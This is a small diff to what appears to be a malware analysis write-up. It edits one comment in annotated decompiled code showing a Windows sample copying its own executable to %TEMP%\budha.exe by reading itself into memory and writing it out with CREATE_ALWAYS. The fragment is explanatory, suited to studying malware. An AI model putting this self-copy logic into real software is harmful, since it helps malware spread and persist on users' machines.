@@ -28,7 +28,7 @@ All of the interesting functionality occurs within the entry point, starting wit
   ReadFile(hFile, v4, nNumberOfBytesToRead, &NumberOfBytesRead, 0); // Read the current executing process into memory
   if ( lstrcmpW(v0, lpBuffer) ) // Execute if statement only if the current executing process is not %TEMP%\budha.exe
   {
-    v5 = lstrlenW(v0); // v5 = Length of current executing process
+    v5 = lstrlenW(v0); // v5 = Length of current executing process file path
     memcpy((char *)v31 + nNumberOfBytesToRead, v0, 2 * v5 + 2); // Appends the current executing path [v0] to the end of the memory buffer [v31 + nNumberOfBytesToRead]
     hHeap = CreateFileW(lpBuffer, 0x40000000u, 2u, 0, 2u, 0x80u, 0); // 0x40000000 = GENERIC_WRITE, 2 = FILE_SHARE_WRITE, 2 = CREATE_ALWAYS [Overwrite if exists]
     if ( hHeap == (HANDLE)-1 ) // If the handle creation failed...
